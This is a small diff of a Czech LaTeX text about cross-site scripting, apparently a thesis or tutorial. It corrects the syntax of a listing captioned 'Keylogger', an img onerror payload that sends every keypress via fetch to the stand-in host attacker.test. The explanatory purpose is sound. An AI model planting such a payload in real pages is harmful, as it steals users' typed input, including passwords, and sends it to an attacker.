@@ -319,7 +319,7 @@ Pokud chce útočník zaznamenávat, co uživatel na stránce píše, může to 
 \begin{lstlisting}[
   caption=Keylogger,
   label=lst1:kl,]
-<img src=x onerror='document.onkeypress = function(e) { fetch (http:///attacker.test?k=" + String.fromCharCode(e.which))}, this.remove();'>
+<img src=x onerror='document.onkeypress = function(e) { fetch ("http://attacker.test?k=" + String.fromCharCode(e.which))}, this.remove();'>
 \end{lstlisting}
 \end{figure}
 
@@ -336,7 +336,7 @@ Přesměrování na útočníkovu stránku pomocí XSS také není vůbec nic sl
 \end{lstlisting}
 \end{figure}
 
-\begin{figure}[h]
+\begin{figure}[H]
 \begin{lstlisting}[
   caption=Tagy umožňující spouštět JavaScript,
   label=lst1:tags,]
